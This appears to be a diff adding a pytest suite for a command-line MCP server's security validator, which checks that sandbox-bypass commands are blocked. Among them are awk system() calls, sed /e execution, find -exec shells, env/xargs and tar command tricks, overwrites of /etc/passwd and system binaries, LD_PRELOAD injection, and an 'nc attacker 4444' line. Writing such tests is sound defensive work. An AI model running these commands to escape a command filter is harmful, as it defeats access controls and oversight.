@@ -1,0 +1,584 @@
+"""Tests for specific security vulnerabilities.
+
+Each test group corresponds to a vulnerability category identified in the
+security analysis. Tests are written before the fix so they initially FAIL,
+then pass once the fix is applied.
+"""
+
+import pytest
+from cmd_line_mcp.config import Config
+from cmd_line_mcp.security import validate_command, is_directory_whitelisted
+
+
+@pytest.fixture
+def default_cmd_lists():
+    """Return command lists from the real default configuration."""
+    config = Config()
+    return config.get_effective_command_lists()
+
+
+def _blocked(cmd_lists, command):
+    """Assert a command is blocked (is_valid == False)."""
+    result = validate_command(
+        command,
+        cmd_lists["read"],
+        cmd_lists["write"],
+        cmd_lists["system"],
+        cmd_lists["blocked"],
+        cmd_lists["dangerous_patterns"],
+    )
+    assert result["is_valid"] is False, (
+        f"Expected '{command}' to be blocked, but it was allowed "
+        f"(type={result['command_type']})"
+    )
+
+
+def _explicitly_blocked(cmd_lists, command):
+    """Assert a command is explicitly blocked (not just 'unsupported').
+
+    Commands that are merely absent from all allowlists get rejected as
+    'not recognized'.  This helper verifies the stronger guarantee: the
+    command must appear in the blocked list and produce a 'blocked for
+    security reasons' error.
+    """
+    result = validate_command(
+        command,
+        cmd_lists["read"],
+        cmd_lists["write"],
+        cmd_lists["system"],
+        cmd_lists["blocked"],
+        cmd_lists["dangerous_patterns"],
+    )
+    assert result["is_valid"] is False, (
+        f"Expected '{command}' to be explicitly blocked, but it was allowed "
+        f"(type={result['command_type']})"
+    )
+    assert "blocked" in (result["error"] or "").lower(), (
+        f"Expected '{command}' to be explicitly blocked, "
+        f"but got: {result['error']}"
+    )
+
+
+# ---------------------------------------------------------------------------
+# V1 — awk sub-execution via system() and getline
+# ---------------------------------------------------------------------------
+
+
+def test_awk_system_call(default_cmd_lists):
+    """awk system() must be blocked."""
+    _blocked(default_cmd_lists, "awk 'BEGIN {system(\"id\")}'")
+
+
+def test_awk_system_call_nc(default_cmd_lists):
+    """awk system() calling a blocked command must be blocked."""
+    _blocked(default_cmd_lists, "awk 'BEGIN {system(\"nc\")}'")
+
+
+def test_awk_system_with_spaces(default_cmd_lists):
+    """awk system() with spaces around parens must be blocked."""
+    _blocked(default_cmd_lists, "awk 'BEGIN { system (\"id\") }'")
+
+
+def test_awk_pipe_to_getline(default_cmd_lists):
+    """awk pipe-to-getline execution must be blocked."""
+    _blocked(default_cmd_lists, 'awk \'BEGIN { while (("id" | getline l) > 0) print l }\'')
+
+
+def test_awk_print_pipe(default_cmd_lists):
+    """awk print-pipe-to-command must be blocked."""
+    _blocked(default_cmd_lists, "cat /tmp/file | awk '{print | \"id\"}'")
+
+
+# ---------------------------------------------------------------------------
+# V2 — sed /e execution flag
+# ---------------------------------------------------------------------------
+
+
+def test_sed_e_flag_basic(default_cmd_lists):
+    """sed substitution with /e flag must be blocked."""
+    _blocked(default_cmd_lists, "echo id | sed 's/.*/&/e'")
+
+
+def test_sed_e_flag_with_command(default_cmd_lists):
+    """sed /e flag embedding a command must be blocked."""
+    _blocked(default_cmd_lists, "sed 's/.*/id/e' /tmp/file")
+
+
+def test_sed_e_flag_malicious(default_cmd_lists):
+    """sed /e flag with network command must be blocked."""
+    _blocked(default_cmd_lists, "echo x | sed 's/x/nc attacker 4444/e'")
+
+
+def test_sed_ge_flags(default_cmd_lists):
+    """sed /ge flags (global + exec) must be blocked."""
+    _blocked(default_cmd_lists, "echo id | sed 's/.*/&/ge'")
+
+
+def test_sed_eg_flags(default_cmd_lists):
+    """sed /eg flags must be blocked."""
+    _blocked(default_cmd_lists, "echo id | sed 's/.*/&/eg'")
+
+
+# ---------------------------------------------------------------------------
+# V3 — find -exec with shell interpreters
+# Use the + terminator (not \;) so the test relies on the -exec pattern,
+# not the accidental semicolon-split path.
+# ---------------------------------------------------------------------------
+
+
+def test_find_exec_sh(default_cmd_lists):
+    """find -exec sh must be blocked."""
+    _blocked(default_cmd_lists, "find /tmp -exec sh -c 'id' {} +")
+
+
+def test_find_exec_bash(default_cmd_lists):
+    """find -exec bash must be blocked."""
+    _blocked(default_cmd_lists, "find /tmp -exec bash -c 'id' {} +")
+
+
+def test_find_exec_python3(default_cmd_lists):
+    """find -exec python3 must be blocked."""
+    _blocked(
+        default_cmd_lists,
+        "find /tmp -maxdepth 0 -exec python3 -c '__import__(\"os\").system(\"id\")' {} +",
+    )
+
+
+def test_find_exec_perl(default_cmd_lists):
+    """find -exec perl must be blocked."""
+    _blocked(default_cmd_lists, "find /tmp -exec perl -e 'system(\"id\")' {} +")
+
+
+def test_find_exec_env(default_cmd_lists):
+    """find -exec env (to proxy into sh) must be blocked."""
+    _blocked(default_cmd_lists, "find /tmp -exec env sh {} +")
+
+
+# ---------------------------------------------------------------------------
+# V3b — find -exec with full path to interpreter
+# The current -exec pattern only matches bare interpreter names.
+# Full paths like /bin/sh or /usr/bin/python3 bypass the check.
+# ---------------------------------------------------------------------------
+
+
+def test_find_exec_fullpath_sh(default_cmd_lists):
+    """find -exec /bin/sh must be blocked (full path to interpreter)."""
+    _blocked(default_cmd_lists, "find /tmp -exec /bin/sh -c 'id' {} +")
+
+
+def test_find_exec_fullpath_python3(default_cmd_lists):
+    """find -exec /usr/bin/python3 must be blocked (full path)."""
+    _blocked(
+        default_cmd_lists,
+        "find /tmp -exec /usr/bin/python3 -c 'import os' {} +",
+    )
+
+
+def test_find_execdir_fullpath_bash(default_cmd_lists):
+    """find -execdir /usr/bin/bash must be blocked (full path)."""
+    _blocked(default_cmd_lists, "find /tmp -execdir /usr/bin/bash -c 'id' {} +")
+
+
+# ---------------------------------------------------------------------------
+# V4 — env executing arbitrary binaries
+# ---------------------------------------------------------------------------
+
+
+def test_env_exec_bash(default_cmd_lists):
+    """env bash must be blocked."""
+    _blocked(default_cmd_lists, "env bash")
+
+
+def test_env_exec_sh(default_cmd_lists):
+    """env sh must be blocked."""
+    _blocked(default_cmd_lists, "env sh -c id")
+
+
+def test_env_exec_python(default_cmd_lists):
+    """env python3 must be blocked."""
+    _blocked(default_cmd_lists, "env python3 -c '__import__(\"os\").system(\"id\")'")
+
+
+def test_env_with_flag_i_sh(default_cmd_lists):
+    """env -i sh must be blocked (flag before interpreter)."""
+    _blocked(default_cmd_lists, "env -i sh -c id")
+
+
+def test_env_with_flag_u_sh(default_cmd_lists):
+    """env -u HOME sh must be blocked (flag before interpreter)."""
+    _blocked(default_cmd_lists, "env -u HOME sh -c id")
+
+
+def test_env_ignore_environment_sh(default_cmd_lists):
+    """env --ignore-environment sh must be blocked."""
+    _blocked(default_cmd_lists, "env --ignore-environment sh")
+
+
+# ---------------------------------------------------------------------------
+# V5 — xargs passing blocked/arbitrary commands
+# ---------------------------------------------------------------------------
+
+
+def test_xargs_sh(default_cmd_lists):
+    """xargs sh must be blocked."""
+    _blocked(default_cmd_lists, "echo id | xargs sh -c")
+
+
+def test_xargs_bash(default_cmd_lists):
+    """xargs bash must be blocked."""
+    _blocked(default_cmd_lists, "ls /tmp | xargs bash -c 'id'")
+
+
+def test_xargs_python(default_cmd_lists):
+    """xargs python3 must be blocked."""
+    _blocked(
+        default_cmd_lists,
+        "echo x | xargs python3 -c '__import__(\"os\").system(\"id\")'",
+    )
+
+
+def test_xargs_env(default_cmd_lists):
+    """xargs env (to proxy into a shell) must be blocked."""
+    _blocked(default_cmd_lists, "echo bash | xargs env")
+
+
+def test_xargs_with_I_flag_sh(default_cmd_lists):
+    """xargs -I{} sh must be blocked (flag before interpreter)."""
+    _blocked(default_cmd_lists, "echo id | xargs -I{} sh -c")
+
+
+def test_xargs_with_max_args_sh(default_cmd_lists):
+    """xargs --max-args=1 sh must be blocked."""
+    _blocked(default_cmd_lists, "echo x | xargs --max-args=1 sh")
+
+
+# ---------------------------------------------------------------------------
+# V6 — tar --checkpoint-action and --to-command
+# ---------------------------------------------------------------------------
+
+
+def test_tar_checkpoint_action(default_cmd_lists):
+    """tar --checkpoint-action=exec must be blocked."""
+    _blocked(
+        default_cmd_lists,
+        "tar -cf /tmp/x.tar --checkpoint=1 --checkpoint-action=exec=id /tmp",
+    )
+
+
+def test_tar_to_command(default_cmd_lists):
+    """tar --to-command must be blocked."""
+    _blocked(default_cmd_lists, "tar -cf /tmp/a.tar --to-command=cat /tmp")
+
+
+def test_tar_checkpoint_action_sh(default_cmd_lists):
+    """tar --checkpoint-action=exec=sh must be blocked."""
+    _blocked(default_cmd_lists, "tar --checkpoint-action=exec=sh /tmp")
+
+
+# ---------------------------------------------------------------------------
+# V9 — Glob-to-regex conversion bugs in whitelist check
+# ---------------------------------------------------------------------------
+
+
+def test_glob_whitelist_does_not_match_extended_prefix():
+    """/tmp/* in whitelist must NOT match /tmp.evil.com/subdir."""
+    whitelisted = ["/tmp/*"]
+    assert not is_directory_whitelisted("/tmp.evil.com/subdir", whitelisted), (
+        "/tmp/* should not match /tmp.evil.com/subdir"
+    )
+
+
+def test_glob_whitelist_matches_subdir():
+    """/tmp/* in whitelist MUST match /tmp/subdir."""
+    whitelisted = ["/tmp/*"]
+    assert is_directory_whitelisted("/tmp/subdir", whitelisted), (
+        "/tmp/* should match /tmp/subdir"
+    )
+
+
+def test_glob_whitelist_dot_in_path_not_wildcard():
+    """A whitelist entry with a literal dot must not match any character."""
+    # /home/user/proj.docs should only match exactly that path, not projXdocs
+    whitelisted = ["/home/user/proj.docs/*"]
+    assert not is_directory_whitelisted("/home/user/projXdocs/sub", whitelisted), (
+        "Dot in whitelist path must be treated as literal, not regex wildcard"
+    )
+
+
+def test_glob_whitelist_exact_dot_path_matches():
+    """A whitelist entry with a literal dot must match the correct path."""
+    whitelisted = ["/home/user/proj.docs/*"]
+    assert is_directory_whitelisted("/home/user/proj.docs/sub", whitelisted), (
+        "/home/user/proj.docs/* should match /home/user/proj.docs/sub"
+    )
+
+
+def test_glob_whitelist_no_partial_match():
+    """/tmp/* must not match /tmpfiles/x — no partial prefix match."""
+    whitelisted = ["/tmp/*"]
+    assert not is_directory_whitelisted("/tmpfiles/x", whitelisted), (
+        "/tmp/* should not match /tmpfiles/x"
+    )
+
+
+# ---------------------------------------------------------------------------
+# V7 — Direct interpreter invocation
+# Interpreters must be *explicitly* blocked (in blocked_commands), not merely
+# absent from allowlists.  The distinction matters: an absent command could be
+# added to an allowlist by a user, bypassing the safety net entirely.
+# ---------------------------------------------------------------------------
+
+
+def test_python3_direct_exec(default_cmd_lists):
+    """python3 must be explicitly blocked."""
+    _explicitly_blocked(default_cmd_lists, "python3 -c 'print(1)'")
+
+
+def test_python3_module_exec(default_cmd_lists):
+    """python3 -m must be explicitly blocked."""
+    _explicitly_blocked(default_cmd_lists, "python3 -m http.server")
+
+
+def test_python_direct_exec(default_cmd_lists):
+    """python must be explicitly blocked."""
+    _explicitly_blocked(default_cmd_lists, "python -c 'print(1)'")
+
+
+def test_perl_direct_exec(default_cmd_lists):
+    """perl must be explicitly blocked."""
+    _explicitly_blocked(default_cmd_lists, "perl -e 'print 1'")
+
+
+def test_ruby_direct_exec(default_cmd_lists):
+    """ruby must be explicitly blocked."""
+    _explicitly_blocked(default_cmd_lists, "ruby -e 'puts 1'")
+
+
+def test_node_direct_exec(default_cmd_lists):
+    """node must be explicitly blocked."""
+    _explicitly_blocked(default_cmd_lists, "node -e 'console.log(1)'")
+
+
+def test_lua_direct_exec(default_cmd_lists):
+    """lua must be explicitly blocked."""
+    _explicitly_blocked(default_cmd_lists, "lua -e 'print(1)'")
+
+
+def test_php_direct_exec(default_cmd_lists):
+    """php must be explicitly blocked."""
+    _explicitly_blocked(default_cmd_lists, "php -r 'echo 1;'")
+
+
+def test_expect_direct_exec(default_cmd_lists):
+    """expect must be explicitly blocked (PTY hijacking)."""
+    _explicitly_blocked(default_cmd_lists, "expect -c 'spawn sh'")
+
+
+def test_script_direct_exec(default_cmd_lists):
+    """script must be explicitly blocked (PTY capture)."""
+    _explicitly_blocked(default_cmd_lists, "script -c 'id' /tmp/out")
+
+
+def _blocked_by_pattern(cmd_lists, command):
+    """Assert a command is blocked specifically by a dangerous pattern.
+
+    Some commands are accidentally blocked by side-effects of naive pipe/
+    separator splitting.  This helper ensures the blocking is intentional
+    — via a dangerous_patterns match — rather than coincidental.
+    """
+    result = validate_command(
+        command,
+        cmd_lists["read"],
+        cmd_lists["write"],
+        cmd_lists["system"],
+        cmd_lists["blocked"],
+        cmd_lists["dangerous_patterns"],
+    )
+    assert result["is_valid"] is False, (
+        f"Expected '{command}' to be blocked by a dangerous pattern, "
+        f"but it was allowed (type={result['command_type']})"
+    )
+    assert "dangerous pattern" in (result["error"] or "").lower(), (
+        f"Expected '{command}' to be caught by a dangerous pattern, "
+        f"but got: {result['error']}"
+    )
+
+
+# ---------------------------------------------------------------------------
+# V8 — find -execdir, -ok, -okdir (variants not covered by -exec pattern)
+# The current pattern only matches -exec followed by an interpreter.
+# -execdir, -ok, and -okdir are equally dangerous but bypass the check.
+# Uses + terminator (not \;) to avoid accidental semicolon-split blocking.
+# ---------------------------------------------------------------------------
+
+
+def test_find_execdir_sh(default_cmd_lists):
+    """find -execdir sh must be blocked."""
+    _blocked(default_cmd_lists, "find /tmp -execdir sh -c 'id' {} +")
+
+
+def test_find_execdir_bash(default_cmd_lists):
+    """find -execdir bash must be blocked."""
+    _blocked(default_cmd_lists, "find /tmp -execdir bash -c 'id' {} +")
+
+
+def test_find_execdir_python(default_cmd_lists):
+    """find -execdir python3 must be blocked."""
+    _blocked(default_cmd_lists, "find /tmp -execdir python3 -c 'print(1)' {} +")
+
+
+def test_find_ok_sh(default_cmd_lists):
+    """find -ok sh must be blocked."""
+    _blocked(default_cmd_lists, "find /tmp -ok sh -c 'id' {} +")
+
+
+def test_find_okdir_bash(default_cmd_lists):
+    """find -okdir bash must be blocked."""
+    _blocked(default_cmd_lists, "find /tmp -okdir bash -c 'id' {} +")
+
+
+# ---------------------------------------------------------------------------
+# V10 — sed /e flag with alternative delimiters
+# sed allows any character as the substitution delimiter (not just /).
+# The current pattern s/[^/]*/[^/]*/[a-zA-Z0-9]*e only matches /.
+# ---------------------------------------------------------------------------
+
+
+def test_sed_at_delimiter_e_flag(default_cmd_lists):
+    """sed s@...@...@e must be blocked."""
+    _blocked(default_cmd_lists, "sed 's@.*@id@e'")
+
+
+def test_sed_hash_delimiter_e_flag(default_cmd_lists):
+    """sed s#...#...#e must be blocked."""
+    _blocked(default_cmd_lists, "sed 's#.*#id#e'")
+
+
+def test_sed_bang_delimiter_e_flag(default_cmd_lists):
+    """sed s!...!...!e must be blocked."""
+    _blocked(default_cmd_lists, "sed 's!.*!id!e'")
+
+
+def test_sed_comma_delimiter_e_flag(default_cmd_lists):
+    """sed s,...,...,e must be blocked."""
+    _blocked(default_cmd_lists, "sed 's,.*,id,e'")
+
+
+def test_sed_pipe_delimiter_e_flag(default_cmd_lists):
+    """sed s|...|...|e must be blocked by a dangerous pattern.
+
+    Note: the | inside the sed expression accidentally triggers pipeline
+    splitting, which blocks the command for the wrong reason.  This test
+    verifies the blocking comes from a dangerous pattern instead.
+    """
+    _blocked_by_pattern(default_cmd_lists, "sed 's|.*|id|e'")
+
+
+def test_sed_at_delimiter_ge_flags(default_cmd_lists):
+    """sed s@...@...@ge (global + exec) must be blocked."""
+    _blocked(default_cmd_lists, "sed 's@.*@id@ge'")
+
+
+# ---------------------------------------------------------------------------
+# V11 — awk coprocess via |& operator
+# The |& operator opens a bidirectional pipe in awk/gawk, allowing
+# arbitrary command execution.  Currently blocked only as a side-effect
+# of naive pipeline splitting on the | character.
+# ---------------------------------------------------------------------------
+
+
+def test_awk_coprocess_getline(default_cmd_lists):
+    """awk |& getline (coprocess) must be blocked by a dangerous pattern."""
+    _blocked_by_pattern(
+        default_cmd_lists, "awk 'BEGIN { \"id\" |& getline result }'"
+    )
+
+
+# ---------------------------------------------------------------------------
+# V12 — tar --use-compress-program and -I flag
+# These flags accept an arbitrary command for (de)compression.
+# Current patterns only cover --checkpoint-action and --to-command.
+# ---------------------------------------------------------------------------
+
+
+def test_tar_use_compress_program(default_cmd_lists):
+    """tar --use-compress-program must be blocked."""
+    _blocked(
+        default_cmd_lists,
+        "tar --use-compress-program=sh -czf /dev/null /tmp",
+    )
+
+
+def test_tar_use_compress_program_quoted(default_cmd_lists):
+    """tar --use-compress-program with quoted command must be blocked."""
+    _blocked(
+        default_cmd_lists,
+        "tar --use-compress-program='sh -c id' -czf /dev/null /tmp",
+    )
+
+
+def test_tar_dash_I_interpreter(default_cmd_lists):
+    """tar -I (short for --use-compress-program) must be blocked."""
+    _blocked(default_cmd_lists, "tar -I sh -czf /dev/null /tmp")
+
+
+# ---------------------------------------------------------------------------
+# V13 — cp/mv to system-critical paths
+# cp and mv are in write_commands but no pattern blocks writes to
+# sensitive destinations like /etc, /boot, /bin, /sbin, /usr/bin, etc.
+# ---------------------------------------------------------------------------
+
+
+def test_cp_to_etc_passwd(default_cmd_lists):
+    """cp to /etc/ must be blocked."""
+    _blocked(default_cmd_lists, "cp /tmp/evil /etc/passwd")
+
+
+def test_cp_to_boot(default_cmd_lists):
+    """cp to /boot/ must be blocked."""
+    _blocked(default_cmd_lists, "cp /tmp/evil /boot/vmlinuz")
+
+
+def test_mv_to_usr_local_bin(default_cmd_lists):
+    """mv to /usr/local/bin/ must be blocked."""
+    _blocked(default_cmd_lists, "mv /tmp/backdoor /usr/local/bin/ls")
+
+
+def test_mv_to_usr_bin(default_cmd_lists):
+    """mv to /usr/bin/ must be blocked."""
+    _blocked(default_cmd_lists, "mv /tmp/evil /usr/bin/cat")
+
+
+def test_cp_to_sbin(default_cmd_lists):
+    """cp to /sbin/ must be blocked."""
+    _blocked(default_cmd_lists, "cp /tmp/evil /sbin/init")
+
+
+# ---------------------------------------------------------------------------
+# V15 — LD_PRELOAD / LD_LIBRARY_PATH / DYLD_INSERT_LIBRARIES injection
+# export is in write_commands and env is in read_commands, so setting
+# dangerous linker variables passes validation unchecked.
+# ---------------------------------------------------------------------------
+
+
+def test_export_ld_preload(default_cmd_lists):
+    """export LD_PRELOAD must be blocked."""
+    _blocked(default_cmd_lists, "export LD_PRELOAD=/tmp/evil.so")
+
+
+def test_env_ld_preload(default_cmd_lists):
+    """env LD_PRELOAD must be blocked."""
+    _blocked(default_cmd_lists, "env LD_PRELOAD=/tmp/evil.so cat /etc/passwd")
+
+
+def test_env_ld_library_path(default_cmd_lists):
+    """env LD_LIBRARY_PATH must be blocked."""
+    _blocked(default_cmd_lists, "env LD_LIBRARY_PATH=/tmp cat /etc/passwd")
+
+
+def test_env_dyld_insert_libraries(default_cmd_lists):
+    """env DYLD_INSERT_LIBRARIES must be blocked (macOS equivalent)."""
+    _blocked(
+        default_cmd_lists,
+        "env DYLD_INSERT_LIBRARIES=/tmp/evil.dylib cat /etc/hosts",
+    )
